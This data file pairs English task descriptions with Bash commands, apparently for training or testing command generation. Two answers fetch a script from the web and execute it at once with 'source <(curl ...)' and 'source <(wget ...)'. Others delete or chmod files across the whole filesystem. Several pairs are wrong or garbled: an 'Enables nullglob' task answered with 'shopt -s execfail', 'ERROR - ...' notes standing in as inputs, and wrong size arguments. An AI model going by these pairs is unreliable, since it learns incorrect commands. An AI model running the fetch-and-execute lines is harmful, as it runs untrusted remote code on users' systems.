{"input": "Duplicate directory tree under /mnt/usr/lib to /usr but creating symlinks to files instead of copying them", "answer": "cp -rs /mnt/usr/lib /usr/"}
{"input": "ERROR - Probably means -pgoDt (capital D)", "answer": "sudo rsync -pgodt /home/ /newhome/"}
{"input": "ERROR - need to add -a or -r for recursive copy", "answer": "rsync --exclude='B/' --exclude='C/' . anotherhost:/path/to/target/directory"}
{"input": "ERROR - this is for DOS", "answer": "ping -n 1 %ip% | find \"TTL\""}
{"input": "ERROR - will overwrite the executable if it's not a symlink", "answer": "sudo ln -sf /usr/local/ssl/bin/openssl `which openssl`"}
{"input": "Eliminates partially duplicate lines by column, keeping the last occurrence", "answer": "tac temp.txt | sort -k2,2 -r -u"}
{"input": "Enables shell option 'autocd'", "answer": "shopt -s autocd"}
{"input": "Enables shell option 'nullglob'", "answer": "shopt -s execfail"}
{"input": "Ensure all 5 of UEDP0{1..5}_20120821.csv files exist, creating empty files for any missing ones (updates the file's timestamps)", "answer": "touch -a UEDP0{1..5}_20120821.csv"}
{"input": "Evaluate the output of recursively changing the owner and group of \"/data/*\" to \"mongodb\"", "answer": "`sudo chown -R mongodb:mongodb /data/*`"}
{"input": "Exclude directory from find . command", "answer": "find ! -path \"dir1\" -iname \"*.mp3\""}
{"input": "Execute \"${MD5}\" on all files found under \"${1}\", numerically sort the results, and save to variable \"DATA\"", "answer": "DATA=$( find \"${1}\" -type f -exec ${MD5} {} ';' | sort -n )"}
{"input": "Execute \"ls -l data.temp\" every 2 seconds", "answer": "watch ls -l data.temp"}
{"input": "Execute \"ls -l\" every 2 seconds", "answer": "watch 'ls -l'"}
{"input": "Execute \"ls -l\" every 2 seconds and highlight the differences in runs", "answer": "watch -d ls -l"}
{"input": "Execute \"ps -C java -o pcpu,state,cputime,etimes\" every second", "answer": "watch -n 1 ps -C java -o pcpu,state,cputime,etimes"}
{"input": "Execute \"script.awk\" on \"file\" and format the output as a table", "answer": "awk -f script.awk file{,} | column -t"}
{"input": "Execute \"wget -qO-  http://fake.link/file.txt\" every 5 seconds", "answer": "watch -n 5 wget -qO-  http://fake.link/file.txt"}
{"input": "Execute 'echo -e \"\\033[31mHello World\\033[0m\"' every without color support 2 seconds", "answer": "watch 'echo -e \"\\033[31mHello World\\033[0m\"'"}
{"input": "Execute /usr/bin/find with $* arguments where current directory is the first argument", "answer": "/usr/bin/find ./ $*"}
{"input": "Execute `echo' for each file found", "answer": "find . | xargs -n 1 echo"}
{"input": "Execute `find -type f | egrep -i \"(jpg|bmp|png|gif)$\"` every 300 seconds and display without title", "answer": "watch -n 300 -t `find -type f | egrep -i \"(jpg|bmp|png|gif)$\"`"}
{"input": "Execute `somecommand' on each file from the current directory tree with the environment variable f set to the filename", "answer": "find . -exec env f={} somecommand \\;"}
{"input": "Execute all commands in \"commands-to-execute-remotely.sh\" on server \"blah_server\"", "answer": "cat commands-to-execute-remotely.sh | ssh blah_server"}
{"input": "Execute awk script \"script.awk\" on \"File2\" and \"File1\" and format output as a table", "answer": "awk -f script.awk File2 File1 | rev | column -t | rev"}
{"input": "Execute awk script \"script.awk\" that exists in \"$PATH\" with argument \"arg1\"", "answer": "awk -f `which script.awk` arg1"}
{"input": "Execute awk script \"script.awk\" with 2 arguments both \"file.txt\" and format the output as a table", "answer": "awk -f script.awk file.txt{,} | column -t"}
{"input": "Execute the file utility for each file found under /etc and below", "answer": "find /etc -print0 | xargs -0 file"}
{"input": "Execute the file utility for each file found under /etc or below that contains \"test\" in its pathname", "answer": "find /etc -print0 | grep -azZ test | xargs -0 file"}
{"input": "Execute the first instance of \"parallel\" found in the PATH, passing it all parameters received by the script/function", "answer": "`which parallel` \"$@\""}
{"input": "Execute zcat on every file matching \"*20120805.gz\" in the current directory and subdirectories", "answer": "find . -name *20120805.gz -exec zcat {} \\;"}
{"input": "Executes 'echo \"$ret\"' in a subshell that is opened by command 'true'", "answer": "true | echo \"$ret\""}
{"input": "Executes 'true'. then makes 'xargs' fail executing 'false' and return 123 exit code", "answer": "true | xargs false"}
{"input": "Executes tmux commands that are stored in the '$tmux_command' variable, and then attaches to the tmux session", "answer": "tmux \"$tmux_command \\; attach\""}
{"input": "Exit the shell immediately if an error is encountered, treat references to unset variables as errors, disable overwriting existing files, and use the first non-zero exit code of a set of piped commands as the exit code of the full set of commands", "answer": "set -o errexit -o nounset -o noclobber -o pipefail"}
{"input": "Expands `whoami` as current user name, and adds resulted path to the directory stack", "answer": "pushd /home/`whoami`/Pictures"}
{"input": "Extract 8 bytes as an unsigned integer that is \"$o\" offset into \"$pkg\"", "answer": "set `od -j $o -N 8 -t u1 $pkg`"}
{"input": "Extract 8 bytes as an unsigned integer that is \"$o\" offset into \"$rpm\"", "answer": "set `od -j $o -N 8 -t u1 $rpm`"}
{"input": "Extract all gzip-compressed files from tar archives beginning with 'myfiles_split.tgz_*'", "answer": "cat myfiles_split.tgz_* | tar xz"}
{"input": "Extract any line in \"f1\" or \"f2\" which does not appear in the other", "answer": "comm -3 <(sort -un f1) <(sort -un f2)"}
{"input": "Extract any line in \"file1.txt\" which does not appear as the first \";\" delimited entry in \"file2.txt\"", "answer": "comm -23 <(sort file1.txt) <(grep -o '^[^;]*' file2.txt | sort)"}
{"input": "Extract any line in \"fileA\" which does not appear as the first word of any line in \"fileB\"", "answer": "comm -23 <(sort fileA) <(cut -d' ' -f1 fileB | sort -u)"}
{"input": "Extract any line in sorted file \"A\" that does not appear in \"B\", \"C\", or \"D\"", "answer": "cat B C D | sort | comm -2 -3 A -"}
{"input": "Extract data from HTML table in \"mycode.html\"", "answer": "paste -d: <(grep '<th>' mycode.html | sed -e 's,</*th>,,g') <(grep '<td>' mycode.html | sed -e 's,</*td>,,g')"}
{"input": "Extract files from archive 'archive.tar'", "answer": "cat archive.tar | tar x"}
{"input": "Extract five digits sequence from a filename with x number of alphanumeric characters followed by the five digit sequence surrounded by a single underscore on either side then another set of x number of alphanumeric characters", "answer": "echo 'someletters_12345_moreleters.ext' | cut -d'_' -f 2"}
{"input": "Extract number from $filename of the form \"something_12345_else\" and set the variable \"number\" to this number", "answer": "number=$(echo $filename | awk -F _ '{ print $2 }')"}
{"input": "Extract protocol part from URL", "answer": "echo \"$url\" | cut -d':' -f1"}
{"input": "Extract the contents of \"Input.txt.gz\", list the unique first comma separated field prefixed by the number of occurrences", "answer": "zcat Input.txt.gz | cut -d , -f 1 | sort | uniq -c"}
{"input": "Extract the second-to-last slash-separated path component, ie. \"90_2a5\" in this case", "answer": "echo 'test/90_2a5/Windows' | xargs dirname | xargs basename"}
{"input": "Extracts a bz2 file", "answer": "bunzip2 file.bz2"}
{"input": "Extracts single file 'filename' from bzip2-compressed tarball archive.tbz", "answer": "bzip2 -dc archive.tbz | tar xvf - filename"}
{"input": "FInd files in current directory and grep text and html files - but not index.html and report things that contain the word 'elevator' in four or more lines", "answer": "find . -type f -print0 | egrep -iazZ '(\\.txt|\\.html?)$' | grep -vazZ 'index.html' | xargs -n 1 -0 grep -c -Hi elevator | egrep -v ':[0123]$'"}
{"input": "Fetch 'stackoverflow.com' domain IP addresses from dig DNS lookup", "answer": "dig stackoverflow.com | grep -e \"^[^;]\" | tr -s \" \\t\" \" \" | cut -d\" \" -f5"}
{"input": "Fetch a script from the web and interpert (run) it in the current shell, without writing the script to disk", "answer": "source <(wget -q -O - \"http://www.modulesgarden.com/manage/dl.php?type=d&id=676\")"}
{"input": "Fetch a script from the web, and interpret it in the current shell", "answer": "source <(curl -s http://mywebsite.com/myscript.txt)"}
{"input": "Fiind and remove multiple files such as *.mp3 or *.txt", "answer": "find . -type f -name \"*.txt\" -exec rm -f {} \\;"}
{"input": "File \"files.txt\" contains a list of files, copy all files listed to host \"remote\", connecting as ssh user \"user\", and copying the files to this user's home directory - this will not work with files/directory names containing spaces", "answer": "cat files.txt | xargs scp user@remote:"}
{"input": "File 'mydatafile' has a number on each line, display the sum of these numbers rounded to lowest integer", "answer": "awk '{s+=$1} END {printf \"%.0f\", s}' mydatafile"}
{"input": "File 'mydatafile' has a number on each line, display the sum of these numbers", "answer": "awk '{s+=$1} END {print s}' mydatafile"}
{"input": "Filnd all directory in root directory with 777 permission and change permision755  with chmod commad ", "answer": "find / -type d  -perm 777 -print -exec chmod 755 {} \\;"}
{"input": "Filnd all files in root directory with 777 permission and change permision 644  with chmod commad ", "answer": "find / -type f -perm 777 -print -exec chmod 644 {} \\;"}
{"input": "Filter /path/to/logfile for any lines containing the specified date, paging interactively through the output", "answer": "grep 'Nov 12 2012' /path/to/logfile | less"}
{"input": "Filter out current date in current time zone from the GMT+30 and GMT+20 representations of current date and show the last one", "answer": "echo -e \"$(TZ=GMT+30 date +%Y-%m-%d)\\n$(TZ=GMT+20 date +%Y-%m-%d)\" | grep -v $(date +%Y-%m-%d) | tail -1"}
{"input": "Filter the cron list of user \"user\" through \"my_wonderful_sed_script\" and re-apply the resulting output", "answer": "crontab -u user -l | sed \"$my_wonderful_sed_script\" | crontab -u user -"}
{"input": "Filters only directories from long file listing of a current directory, and prints their names", "answer": "ls -l | grep \"^d\" | awk -F\" \" '{print $9}'"}
{"input": "Filters only directories including hidden ones from long file listing of a current directory, and prints their names", "answer": "ls -Al | grep \"^d\" | awk -F\" \" '{print $9}'"}
{"input": "Filters out strings, using the extended regexp pattern '^#|^$|no crontab for|cannot use this program' from \"$USERTAB\"", "answer": "echo \"$USERTAB\"| grep -vE '^#|^$|no crontab for|cannot use this program'"}
{"input": "Filters unique lines by matching against the first column of a .csv file", "answer": "tac a.csv | sort -u -t, -r -k1,1 |tac"}
{"input": "Find \"*.dat\" files recursively in the current directory, print the lines starting on line 5 to the console and save to \"concat.txt\"", "answer": "find . -type f \\( -name \"*.dat\" \\) -exec tail -n+5 -q \"$file\" {} + |tee concat.txt"}
{"input": "Find \"*201512*\" regular files in /home/myhome/data/ARCHIVE/ and move them to /home/myhome/ARCHIVE/TempFolder/", "answer": "find /home/myhome/data/ARCHIVE/. -name . -o -type d -prune -o -name '*201512*' -print | xargs -i mv {} /home/myhome/ARCHIVE/TempFolder/."}
{"input": "Find \"*prefs copy\" files in the /mnt/zip directory tree and remove them", "answer": "find /mnt/zip -name \"*prefs copy\" -print0 | xargs rm"}
{"input": "Find \"*prefs copy\" files in the /mnt/zip directory tree and remove them with prompting", "answer": "find /mnt/zip -name \"*prefs copy\" -print0 | xargs -p rm"}
{"input": "Find \".c\" and \".h\" files in the current directory tree and print line numbers and lines containing \"#include\"", "answer": "tree -if | grep \\\\.[ch]\\\\b | xargs -n 1 grep -nH \"#include\""}
{"input": "Find \".c\" and \".h\" files in the current directory tree and print lines containing \"#include\"", "answer": "tree -if | grep \\\\.[ch]\\\\b | xargs -n 1 grep -H \"#include\""}
{"input": "Find \"file.xml\" under the current directory and change directory to its parent", "answer": "cd `find . -name file.xml -exec dirname {} \\;`"}
{"input": "Find & Substitute Only 2nd Occurrence of a Word Using sed s//2 in all .txt files", "answer": "find . -type f -name \"*.txt\" -exec sed 's/Linux/Linux-Unix/2' thegeekstuff.txt"}
{"input": "Find & Write Changes to a File and Print the Changes Using sed s//gpw", "answer": "find . -type f -name \"*.txt\" -exec sed -n 's/Linux/Linux-Unix/gpw output' thegeekstuff.txt"}
{"input": "Find & calculate total number of caractor  in all .txt file from current directory", "answer": "find .  -type f  -name '*.txt' -exec wc -c {} \\; | awk '{total += $1} END{print total}'"}
{"input": "Find & calculate total number of worlds in all .txt file from current directory", "answer": "find .  -type f  -name '*.txt' -exec wc -w {} \\; | awk '{total += $1} END{print total}'"}
{"input": "Find & replace broken symbolic links", "answer": "find -L . -type l -delete -exec ln -s new_target {} \\;"}
{"input": "Find '*prefs copy' files under /mnt/zip and delete them with confirmation prompt ensuring white space safety", "answer": "find /mnt/zip -name \"*prefs copy\" -print0 | xargs    -0 -p /bin/rm"}
{"input": "Find '.git' directories in directory tree /path/to/files and print the pathnames of their parents", "answer": "find /path/to/files -type d -name '.git' -exec dirname {} +"}
{"input": "Find '.java' files with checksum 0bee89b07a248e27c83fc3d5951213c1 in the current directory", "answer": "md5sum *.java | grep 0bee89b07a248e27c83fc3d5951213c1"}
{"input": "Find *.avi and *.flv files in /path/to/your/directory and below and copy them to /path/to/specific/folder", "answer": "find /path/to/your/directory -regex '.*\\.\\(avi\\|flv\\)' -exec cp {} /path/to/specific/folder \\;"}
{"input": "Find *.c and *.h files under the current directory tree skipping hidden directories and files", "answer": "find . \\( -path '*/.*' -prune -o ! -name '.*' \\) -a -name '*.[ch]'"}
{"input": "Find *.c and *.sh files", "answer": "find . -type f \\( -name \"*.c\" -o -name \"*.sh\" \\)"}
{"input": "Find *.c files under $HOME and search for the string 'sprintf' in those files", "answer": "find $HOME -name '*.c' -print | xargs    grep -l sprintf"}
{"input": "Find *.conf files/directories only upto 1 level down under /etc directory and show a few lines of output from the end", "answer": "find /etc -maxdepth 1 -name \"*.conf\" | tail"}
{"input": "Find *.conf files/directories only upto 2 levels down under /etc directory and show a few lines of output from the end", "answer": "find /etc -maxdepth 2 -name \"*.conf\" | tail"}
{"input": "Find *.css files in the current directory tree, skipping all directories that match pattern '*/lang/en.css'", "answer": "find . -path '*/lang/en.css' -prune -o -name '*.css' -print"}
{"input": "Find *.html files in the current directory tree that were modified less than 7 days ago", "answer": "find . -mtime -7 -name \"*.html\" -print"}
{"input": "Find *.java files in the current directory and replace foo with bar in those files", "answer": "find . -name \"*.java\" -exec sed -i '' s/foo/bar/g \\;"}
{"input": "Find *.java files in the current directory with GNU find and replace foo with bar in those files", "answer": "find . -name \"*.java\" -exec sed -i s/foo/bar/g \\;"}
{"input": "Find *.java files under current directory and compress them to myfile.tar", "answer": "find . -type f -name \"*.java\" | xargs    tar rvf myfile.tar"}
{"input": "Find *.java files under current directory and compress them to myfile.tar  (unsafe)", "answer": "find . -type f -name \"*.java\" | xargs    tar cvf myfile.tar"}
{"input": "Find *.jpg screenshots that are bigger than 500k", "answer": "find ~/Images/Screenshots -size +500k -iname '*.jpg'"}
{"input": "Find *.js UTF-8 files with BOM and correct them", "answer": "find . -iname *.js -type f -exec sed 's/^\\xEF\\xBB\\xBF//' -i.bak {} \\; -exec rm {}.bak \\;"}
{"input": "Find *.o files with permissions 664 in the current directory tree", "answer": "find . -name *.o -perm 664 -print"}
{"input": "Find *.tex files in the current directory tree that contain text \"documentclass\"", "answer": "find . -type f -name *.tex -print0 | xargs -0 grep -l 'documentclass'"}
{"input": "Find *.txt files in the current directory tree, ignoring paths ./Movies/*, ./Downloads/*, and ./Music/*", "answer": "find . -type f -name \"*.txt\" ! -path \"./Movies/*\" ! -path \"./Downloads/*\" ! -path \"./Music/*\""}
{"input": "Find *2011* files and grep for the string 'From: Ralph' in those files", "answer": "find . -name '*2011*' -print | xargs -n2 grep 'From: Ralph'"}
{"input": "Find *log files/directories within a maximum of 3 levels of directories", "answer": "find / -maxdepth 3  -name \"*log\""}
{"input": "Find .cpp files that differs in subdirectories PATH1 and PATH2", "answer": "diff -rqx \"*.a\" -x \"*.o\" -x \"*.d\" ./PATH1 ./PATH2 | grep \"\\.cpp \" | grep \"^Files\""}
{"input": "Find .java files in the current directory tree that contain 'TODO', and print their names", "answer": "find . -name \"*.java\" -exec grep -Hin TODO {} + | basename `cut -d \":\" -f 1`"}
{"input": "Find .java files in the current directory tree that contain 'TODO', and print their pathnames", "answer": "find . -name \"*.java\" -exec grep -Hin TODO {} + | cut -d \":\" -f 1"}
{"input": "Find .jpg files owned by user daniel in the current directory and its sub-directories but ignore any file beginning with \"autumn\"", "answer": "find . -user daniel -type f -name *.jpg ! -name autumn*"}
{"input": "Find .rmv files in the ./root directory recursively and copy them to directory /copy/to/here", "answer": "find root -name '*.rmv' -type f -exec cp --parents \"{}\" /copy/to/here \\;"}
{"input": "Find .txt files on the system whose size is greater than 12000 bytes", "answer": "find / -name \"*.txt\" -size +12000c"}
{"input": "Find 10 largest files in the current directory and its subdirectories", "answer": "du -hsx * | sort -rh | head -10"}
{"input": "Find 10 most recently changed files in the current directory tree", "answer": "find . -type f -printf \"%C@ %p\\n\" | sort -rn | head -n 10"}
{"input": "Find PHP files containing 2 or more classes", "answer": "find . -type f -name \"*.php\" -exec grep --with-filename -c \"^class \" {} \\; | grep \":[2-99]\" | sort -t \":\" -k 2 -n -r"}
{"input": "Find PHP files with abstract classes", "answer": "find . -type f -name \"*.php\" -exec grep --with-filename -c \"^abstract class \" {} \\; | grep \":[^0]\""}
{"input": "Find SGID files", "answer": "find / -perm +2000"}
{"input": "Find SQL files with text `expression'", "answer": "find . -name \"*.sql\" -print0 -type f | xargs -0 grep \"expression\""}
{"input": "Find SUID files", "answer": "find / -perm +4000"}
{"input": "Find StringBuffer in all *.java files", "answer": "find . -type f -name \"*.java\" -exec grep -l StringBuffer {} \\;"}
{"input": "Find UTF-8 files with BOM", "answer": "find . -type f -print0 | xargs -0 awk '/^\\xEF\\xBB\\xBF/ {print FILENAME} {nextfile}'"}
{"input": "Find `string' in all *.java files ignoring the case of that string", "answer": "find . -type f -name \"*.java\" -exec grep -il string {} \\;"}
{"input": "Find a directory named 'project.images' case insensitively in the entire filesystem and show it in long listing format", "answer": "find  / -type d -iname \"project.images\" -ls"}
{"input": "Find a directory named 'project.images' in the entire filesystem", "answer": "find  / -type d -name \"project.images\""}
{"input": "Find a more recent version of httpd.conf file than /etc/apache-perl/httpd.conf in entire file system", "answer": "find / -name httpd.conf -newer /etc/apache-perl/httpd.conf"}
{"input": "Find a single file called FindCommandExamples.txt under current directory and remove it", "answer": "find . -type f -name \"FindCommandExamples.txt\" -exec rm -f {} \\;"}
{"input": "Find a single file called tecmint.txt and remove it", "answer": "find . -type f -name \"tecmint.txt\" -exec rm -f {} \\;"}
{"input": "Find a size of only the target directory in MB format", "answer": "du -s --block-size=M /path/to/your/directory/"}
{"input": "Find a used disk space of a target directory and files inside of it", "answer": "du -h your_directory"}
{"input": "Find a.out and object files in the current directory tree", "answer": "find . ( -name a.out -o -name *.o ) -print"}
{"input": "Find all \"YourProgramName\" regular files in the current directory tree and print the full paths to the directories containing them", "answer": "find . -type f -name YourProgramName -execdir pwd \\;"}
{"input": "Find all $1 files/directories under current directory and enter into the parent directory of the first one found", "answer": "cd $(dirname $(find . -name $1 | sed 1q))"}
{"input": "Find all $2 files in $1 path and search for the regex expanded by $3 in those files", "answer": "find $1 -name \"$2\" -exec grep -Hn \"$3\" {} \\;"}
{"input": "Find all $2 files in $1 path and search for the regex expanded by $3 in those files excluding the files with /proc in their paths", "answer": "find $1 -name \"$2\" | grep -v '/proc' | xargs grep -Hn \"$3\" {} \\;"}
{"input": "Find all $2 files in $1 path excluding /proc and search for the regex expanded by $3 in those files", "answer": "find $1 -path /proc -prune -o -name \"$2\" -print -exec grep -Hn \"$3\" {} \\;"}
{"input": "Find all '*~' files under current directory", "answer": "find ./ -name '*~'"}
{"input": "Find all 'test' directories in the current directory tree", "answer": "find -type d -a -name test"}
{"input": "Find all 'test' directories in the current directory tree and remove them", "answer": "find -type d -a -name test|xargs rm -r"}
{"input": "Find all *.* directories under /home/feeds/data directory", "answer": "find /home/feeds/data -type d \\( -name 'def/incoming' -o -name '456/incoming' -o -name arkona \\) -prune -o -name '*.*' -print"}
{"input": "Find all *.* files not within .git directory and run $SED_CMD -i \"s/$1/$2/g\" on each of them", "answer": "find . -type f -name \"*.*\" -not -path \"*/.git/*\" -print0 | xargs -0 $SED_CMD -i \"s/$1/$2/g\""}
{"input": "Find all *.* files under current directory", "answer": "find . -type f -a -name '*.*'"}
{"input": "Find all *.[ch] files under current directory", "answer": "find . -name '*.[ch]'"}
{"input": "Find all *.c files in /usr/src bigger than 100k", "answer": "find /usr/src -name '*.c' -size +100k -print"}
{"input": "Find all *.c files located under /home and below", "answer": "find /home -name \"*.c\""}
{"input": "Find all *.c files on the system and feed the output to wc", "answer": "find / -name *.c | wc"}
{"input": "Find all *.c files under and below the current directory that contain \"hogehoge\"", "answer": "find . -name \\*.c | xargs grep hogehoge"}
{"input": "Find all *.c files under and below the current directory that contain \"wait_event_interruptible\"", "answer": "find . -name \\*.c -exec grep wait_event_interruptible {} +"}
{"input": "Find all *.cgi (case insensitive) files/directories under current directory and change their permission to 755", "answer": "find . -iname '*.cgi' | xargs chmod 755"}
{"input": "Find all *.cgi files/directories under current directory and change their permission to 755", "answer": "find . -name '*.cgi' -print0 | xargs -0 chmod 755"}
{"input": "Find all *.cgi files/directories under current directory and change their permission to 775", "answer": "find . -name '*.cgi' -print0 | xargs -0 chmod 775"}
{"input": "Find all *.cls files/directories under current directory and print '{if(length($0) > L) { LINE=$0; L = length($0)}} END {print LINE\"L\"L}' for each of them where $0 is expanded to the file/directory path", "answer": "find . -iname \"*.cls\" -exec echo '{if(length($0) > L) { LINE=$0; L = length($0)}} END {print LINE\"L\"L}' {} \\;"}
{"input": "Find all *.cpp files in the current directory tree that contain \"sub\" in their names", "answer": "find . -name \"*sub*.cpp\""}
{"input": "Find all *.css files under $DIR and print the lines matching the regex '\\.ExampleClass.{/,/}' from those files", "answer": "find ${DIR} -type f -name \"*.css\" -exec sed -n '/\\.ExampleClass.{/,/}/p' \\{\\} \\+"}
{"input": "Find all *.css files under /starting/directory and print filenames and the lines matching the regex '\\.ExampleClass' from those files", "answer": "find /starting/directory -type f -name '*.css' | xargs -ti grep '\\.ExampleClass' {}"}
{"input": "Find all *.csv files under /foo/bar and move them to some_dir", "answer": "find /foot/bar/ -name '*.csv' -print0 | xargs -0 mv -t some_dir"}
{"input": "Find all *.csv files under /foot/bar/ and move them to some_dir", "answer": "find /foot/bar/ -name '*.csv' -print0 | xargs -0 mv -t some_dir"}
{"input": "Find all *.epub, *.mobi, *.chm, *.rtf, *.lit and *.djvu files/directories under current directory", "answer": "find ./ -name '*.epub' -o -name '*.mobi' -o -name '*.chm' -o -name '*.rtf' -o -name '*.lit' -o -name '*.djvu'"}
{"input": "Find all *.err files under current directory that are larger than 5120 bytes in size", "answer": "find . -type f -size +10 -name \"*.err\""}
{"input": "Find all *.ext files/directories under current directory and print their path and parent directory path", "answer": "find /path -type f -name \"*.ext\" -printf \"%p:%h\\n\""}
{"input": "Find all *.foo files under current directory and print their contents", "answer": "cat $(find . -name '*.foo')"}
{"input": "Find all *.foo files under current directory and search for 'bar' in those files", "answer": "find . -name '*.foo' -exec grep bar {} \\;"}
{"input": "Find all *.htm files under current directory", "answer": "find -type f -name \"*.htm\""}
{"input": "Find all *.htm files under current directory and print the changed names by appending 3 levels of parent directory names at the beginning and modifying the actual name to dd-nnn format", "answer": "find -type f -name \"*.htm\" | awk -F'[/]' 'BEGIN{OFS=\"-\"}{ gsub(/^\\.\\//,\"\") ;print $1,$2, substr($4,3,2),substr($4,5,2),substr($4,8) }'"}
{"input": "Find all *.html files under current directory and for each file replace the first occurrence of STRING and previous lines with the content of common_header file", "answer": "find . -type f -name '*.html' -exec sed -i -e '1r common_header' -e '1,/STRING/d' {} \\;"}
{"input": "Find all *.java files under current directory and archive them to myfile.tar", "answer": "find . -type f -name \"*.java\" | xargs tar rvf myfile.tar"}
{"input": "Find all *.java files under current directory and replace every occurrences of 'subdomainA.example.com' with 'subdomainB.example.com' in those files", "answer": "find /home/www -name \"*.java\" -type f -print0 | xargs -0 sed -i 's/subdomainA\\.example\\.com/subdomainB.example.com/g'"}
{"input": "Find all *.java files under current directory containing the string 'String'", "answer": "find . -name \"*.java\" -exec grep \"String\" {} \\+"}
{"input": "Find all *.jpg files and copy them to /", "answer": "find / -type f -name *.jpg  -exec cp {} . \\;"}
{"input": "Find all *.jpg files in */201111 paths", "answer": "find */201111 -name \"*.jpg\""}
{"input": "Find all *.jpg files in */201111/* paths and numerically sort them according to the second field in the file name with a delimiter '_'", "answer": "find */201111/* -name \"*.jpg\" | sort -t '_' -nk2"}
{"input": "Find all *.jpg files under current directory and print only duplicate names", "answer": "find . -name \\*.jpg -exec basename {} \\; | uniq -d"}
{"input": "Find all *.jpg files under current directory and print only unique names", "answer": "find . -name *.jpg | uniq -u"}
{"input": "Find all *.log files under current directory that contain the string \"Exception\"", "answer": "find . -name '*.log' -mtime -2 -exec grep -Hc Exception {} \\; | grep -v :0$"}
{"input": "Find all *.log files under path/ that do not contain \"string that should not occur\"", "answer": "find path/ -name '*.log' -print0 | xargs -r0 grep -L \"string that should not occur\""}
{"input": "Find all *.m4a files under /home/family/Music directory", "answer": "find  /home/family/Music -type f -name '*.m4a' -print0"}
{"input": "Find all *.m4a files/directories under /home/family/Music directory", "answer": "find /home/family/Music -name '*.m4a' -print0"}
{"input": "Find all *.mov (case insensitive) files under current directory and list their paths with their names", "answer": "find . -iname \"*.mov\" -printf \"%p %f\\n\""}
{"input": "Find all *.mp3 (case insensitive) files/directories under /tmp and remove them", "answer": "find /tmp -iname '*.mp3' -print0 | xargs -0 rm"}
{"input": "Find all *.mp3 files in entire file system greater than 10MB and delete them", "answer": "find / -type f -name *.mp3 -size +10M -exec rm {} \\;"}
{"input": "Find all *.mp3 files in file system with more than 10MB and delete them using rm command", "answer": "find / -type f -name *.mp3 -size +10M -exec rm {} \\;"}
{"input": "Find all *.mp3, *.aif*, *.m4p, *.wav, *.flac files under $musicdir directory", "answer": "find \"$musicdir\" -type f -print | egrep -i '\\.(mp3|aif*|m4p|wav|flac)$'"}
{"input": "Find all *.mp4 files under /foo/bar and move them to /some/path", "answer": "find /foo/bar -name '*.mp4' -print0 | xargs -I{} -0 mv -t /some/path {}"}
{"input": "Find all *.mp4 files under directory named 'working' and show the first one found", "answer": "find working -type f -name \"*.mp4\" | head -1"}
{"input": "Find all *.ogg (case insensitive) files under your home directory that are less than 100MB in size", "answer": "find $HOME -iname '*.ogg' -type f -size -100M"}
{"input": "Find all *.ogg (case insensitive) files/directories in entire file system", "answer": "sudo find / -iname '*.ogg'"}
{"input": "Find all *.ogg (case insensitive) files/directories under your home directory", "answer": "find $HOME -iname '*.ogg'"}
{"input": "Find all *.ogg (case insensitive) files/directories under your home directory that are greater than 100MB in size", "answer": "find $HOME -iname '*.ogg' -size +100M"}
{"input": "Find all *.ogg (case insensitive) files/directories under your home directory that are greater than 20MB in size", "answer": "find $HOME -iname '*.ogg' -size +20M"}
{"input": "Find all *.ogg (case insensitive) files/directories under your home directory that are not greater than 20MB in size", "answer": "find $HOME -iname '*.ogg' ! -size +20M"}
{"input": "Find all *.ogg and *.mp3 (case insensitive) files/directories under your home directory", "answer": "find $HOME -iname '*.ogg' -o -iname '*.mp3'"}
{"input": "Find all *.ogg files on the system ignoring the case", "answer": "find / -iname '*.ogg'"}
{"input": "Find all *.old files and move them to directory oldfiles", "answer": "find . -name \"*.old\" -exec mv {} oldfiles \\;"}
{"input": "Find all *.p[lm] files under /users/tom directory that matches both the regex '->get(' and '#hyphenate' in their contents", "answer": "find /users/tom -name '*.p[lm]' -exec grep -l -- '->get(' {} + | xargs grep -l '#hyphenate'"}
{"input": "Find all *.p[lm] files under /users/tom directory that matches the regex '->get(\\|#hyphenate' in their contents", "answer": "find /users/tom -name '*.p[lm]' -exec grep -l -- '->get(\\|#hyphenate' {} +"}
{"input": "Find all *.p[lm] files/directories under current directory", "answer": "find -name '*.p[lm]'"}
{"input": "Find all *.pdf.marker files under ${INPUT_LOCATION} and move them to ${OUTPUT_LOCATION} also move any *.pdf files with the same name under current directory to ${OUTPUT_LOCATION}", "answer": "find ${INPUT_LOCATION}/ -name \"*.pdf.marker\" | xargs -I file mv file $(basename file .marker) ${OUTPUT_LOCATION}/."}
{"input": "Find all *.php (case insensitive) and *.js files (case insensitive) under /home/jul/here excluding  /home/jul/here/exclude/* paths", "answer": "find /home/jul/here -type f \\( -iname \"*.php\" -o -iname \"*.js\" \\) ! -path \"/home/jul/here/exclude/*\""}
{"input": "Find all *.php (case insensitive) files and *.js files/directories (case insensitive) under /home/jul/here excluding $EXCLUDE/* paths", "answer": "find /home/jul/here -type f -iname \"*.php\" ! -path \"$EXCLUDE/*\" -o -iname \"*.js\" ! -path \"$EXCLUDE/*\""}
{"input": "Find all *.php (case insensitive) files and *.js files/directories (case insensitive) under /home/jul/here excluding *.js files/directories under /home/jul/here/exclude/* paths", "answer": "find /home/jul/here -type f -iname \"*.php\" -o -iname \"*.js\" ! -path \"/home/jul/here/exclude/*\""}
{"input": "Find all *.php (case insensitive) files and *.js files/directories (case insensitive) under /home/jul/here excluding /home/jul/here/exclude/* paths", "answer": "find /home/jul/here -type f -iname \"*.php\" ! -path \"/home/jul/here/exclude/*\" -o -iname \"*.js\" ! -path \"/home/jul/here/exclude/*\""}
{"input": "Find all *.php files under current directory and change their permission to 640", "answer": "chmod 640 $(find . -name *.php)"}
{"input": "Find all *.ps files under $STARTDIR", "answer": "find $STARTDIR -name '*.ps' -print"}
{"input": "Find all *.py (case insensitive) files/directories under dir directory ignoring .git path", "answer": "find dir -not -path '.git' -iname '*.py'"}
{"input": "Find all *.py files under and below the current directory and search them for \"xrange\"", "answer": "find . -name '*.py' -exec grep --color 'xrange' {} +"}
{"input": "Find all *.py files under current directory and search for regular expressions taken from the search_terms.txt file", "answer": "find . -name '*.py' -exec grep -n -f search_terms.txt '{}' \\;"}
{"input": "Find all *.rb (regular) files under current directory and count their line numbers", "answer": "find . -name \"*.rb\" -type f -exec wc -l \\{\\} \\;"}
{"input": "Find all *.rb (regular) files under current directory and print them on stdout putting the file name/path in-between two string literals 'Hello,' and '!'", "answer": "find . -name \"*.rb\" -type f | xargs -I {} echo Hello, {} !"}
{"input": "Find all *.rb (regular) files under current directory ensuring white space safety and print at most two file names/paths per line", "answer": "find . -name \"*.rb\" -type f -print0 | xargs -0 -n 2 echo"}
{"input": "Find all *.rb and *.py files/directories under current directory", "answer": "find . -name \"*.rb\" -or -name \"*.py\""}
